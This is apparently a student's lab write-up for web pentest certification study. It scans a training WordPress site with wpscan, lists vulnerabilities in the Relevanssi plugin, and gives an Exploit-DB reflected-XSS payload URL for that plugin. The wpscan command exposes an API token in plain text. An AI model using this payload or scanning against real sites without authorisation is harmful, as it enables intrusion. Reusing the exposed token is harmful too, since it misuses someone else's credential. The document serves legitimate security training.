2025-06-23 16:05

Status:

Tags: [[eWPT]] [[XSS Attacks]]
###### Prerequisites: 
# Word Press
the lab has wordpress website that has XSS reflected and i can scan the website using wpscan but it needs api token for it to scan for vulnerabilities 
so i used
```bash
wpscan --url https://7bsbuzx764d1i68kreckihj2v.eu-central-5.attackdefensecloudlabs.com/ --enumerate p --plugins-detection aggressive --api-token C2oD4YzgIh9g4GS2isssXauSdu4M0aSQvgQ0h7m96dk

```
and the result were
```cpp
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: https://7bsbuzx764d1i68kreckihj2v.eu-central-5.attackdefensecloudlabs.com/ [172.104.229.221]
[+] Started: Mon Jun 23 09:05:13 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - server: Apache/2.4.7 (Ubuntu)
 |  - x-powered-by: PHP/5.5.9-1ubuntu4.25
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - https://7bsbuzx764d1i68kreckihj2v.eu-central-5.attackdefensecloudlabs.com/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - https://7bsbuzx764d1i68kreckihj2v.eu-central-5.attackdefensecloudlabs.com/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |
 | [!] 87 vulnerabilities identified:
 |
[i] Plugin(s) Identified:

[+] relevanssi
 | Location: https://7bsbuzx764d1i68kreckihj2v.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/relevanssi/
 | Last Updated: 2025-05-23T02:11:00.000Z
 | Readme: https://7bsbuzx764d1i68kreckihj2v.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/relevanssi/readme.txt
 | [!] The version is out of date, the latest version is 4.24.6
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://7bsbuzx764d1i68kreckihj2v.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/relevanssi/, status: 200
 |
 | [!] 10 vulnerabilities identified:
 |
 | [!] Title: Relevanssi - A Better Search < 4.14.3 - Unauthenticated Stored Cross-Site Scripting
 |     Fixed in: 4.14.3
 |     References:
 |      - https://wpscan.com/vulnerability/ad08bd11-e4b0-4bb1-9481-3c9651f50466
 |      - https://plugins.trac.wordpress.org/changeset/2616189/relevanssi
 |
 | [!] Title: Relevanssi - Subscriber+ Unauthorised AJAX Calls
 |     Fixed in: 4.14.6
 |     References:
 |      - https://wpscan.com/vulnerability/c0c27674-715e-464d-ab38-0774128e6741
 |      - https://plugins.trac.wordpress.org/changeset/2648642
 |      - https://plugins.trac.wordpress.org/changeset/2648980
 |
 | [!] Title: Relevanssi (Free < 4.22.0, Premium < 2.25.0) - Unauthenticated Private/Draft Post Disclosure
 |     Fixed in: 4.22.0
 |     References:
 |      - https://wpscan.com/vulnerability/0c96a128-4473-41f5-82ce-94bba33ca4a3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-7199
 |      - https://www.relevanssi.com/release-notes/premium-2-25-free-4-22-release-notes/
 |
 | [!] Title: Relevanssi < 4.22.1 - Unauthenticated Query Log Export
 |     Fixed in: 4.22.1
 |     References:
 |      - https://wpscan.com/vulnerability/79c73a0a-087f-4971-a95f-c21d1d4db26e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1380
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7b2a3b17-0551-4e02-8e6a-ae8d46da0ef8
 |
 | [!] Title: Relevanssi – A Better Search < 4.22.2 - Missing Authorization to Unauthenticated Count Option Update
 |     Fixed in: 4.22.2
 |     References:
 |      - https://wpscan.com/vulnerability/7b3ce9a6-17e1-42e1-b220-11c69300a9ca
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3213
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e625130f-8e21-4baf-9d3c-4cbb806b9e52
 |
 | [!] Title: Relevanssi < 4.23.0 - Unauthenticated Information Exposure
 |     Fixed in: 4.23.0
 |     References:
 |      - https://wpscan.com/vulnerability/0da3d56a-b3a8-43ac-873e-40cbda74165d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-7630
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/3fa78f4e-ede2-4863-a2d7-99bd8c7b5912
 |
 | [!] Title: Relevanssi < 4.23.1 - Contributor+ Stored XSS
 |     Fixed in: 4.23.1
 |     References:
 |      - https://wpscan.com/vulnerability/5f25646d-b80b-40b1-bcaf-3b860ddc4059
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9021
 |      - https://research.cleantalk.org/CVE-2024-XXXX/
 |      - https://www.youtube.com/watch?v=https://drive.google.com/file/d/1qhjBeZVX3rCGxXm18cA6XT42wEwKLhcj/view?usp=sharing
 |
 | [!] Title: Relevanssi <= 4.24.3 (Free) and <= 2.27.4 (Premium) - Unauthenticated Stored Cross-Site Scripting via Search Highlights
 |     Fixed in: 4.24.4
 |     References:
 |      - https://wpscan.com/vulnerability/2295e503-5045-49a8-a279-43b04df36685
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4054
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6f77f10b-f142-4859-a941-0fbde6ef7fdb
 |
 | [!] Title: Relevanssi < 4.24.5 (Free) and < 2.27.5 (Premium) - Unauthenticated SQL Injection
 |     Fixed in: 4.24.5
 |     References:
 |      - https://wpscan.com/vulnerability/7b8ffd97-d9a4-43e1-9fc1-395230103f06
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4396
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/197be163-4504-4caa-b729-c3293463cfb5
 |
 | [!] Title: Relevanssi <= 4.24.5 (Free) and <= 2.27.6 (Premium) - Unauthenticated Stored Cross-Site Scripting via Excerpt Highlights
 |     Fixed in: 4.24.6
 |     References:
 |      - https://wpscan.com/vulnerability/2682b3b9-3b06-4907-bfe0-4f31fdcab196
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-5016
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ffb2ade3-d5ce-4459-ab83-e28cd4c84922
 |
 | Version: 4.0.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://7bsbuzx764d1i68kreckihj2v.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/relevanssi/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://7bsbuzx764d1i68kreckihj2v.eu-central-5.attackdefensecloudlabs.com/wp-content/plugins/relevanssi/readme.txt

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Mon Jun 23 09:06:08 2025
[+] Requests Done: 1550
[+] Cached Requests: 8
[+] Data Sent: 504.63 KB
[+] Data Received: 14.736 MB
[+] Memory used: 230.711 MB
[+] Elapsed time: 00:00:55
                       
```
### and it worked ton of vulnerabilities are found but i deleted them because we are not interested at the moment we are interested in the plugin Relevanssi so i use searchploit to search for the exploit

```shell
──(aboshe㉿kali)-[~]
└─$ searchsploit Relevanssi
---------------------------------------------------------------------------------
 Exploit Title                                                                                                                                  |  Path
---------------------------------------------------------------------------------
WordPress Plugin Relevanssi - 'category_name' SQL Injection                                                                                     | php/webapps/39109.txt
WordPress Plugin Relevanssi 2.7.2 - Persistent Cross-Site Scripting                                                                             | php/webapps/16233.txt
WordPress Plugin Relevanssi 4.0.4 - Reflected Cross-Site Scripting                                                                              | php/webapps/44366.txt
---------------------------------------------------------------------------------
Shellcodes: No Results
```
### So i searched in exploitDB for the plugin and found the payload that i need to put in the link 
```JavaScript
/wp-admin/options-general.php?page=relevanssi%2Frelevanssi.php&tab='><SCRIPT>var+x+%3D+String(%2FXSS%2F)%3Bx+%3D+x.substring(1%2C+x.length-1)%3Balert(x)<%2FSCRIPT><BR+
```
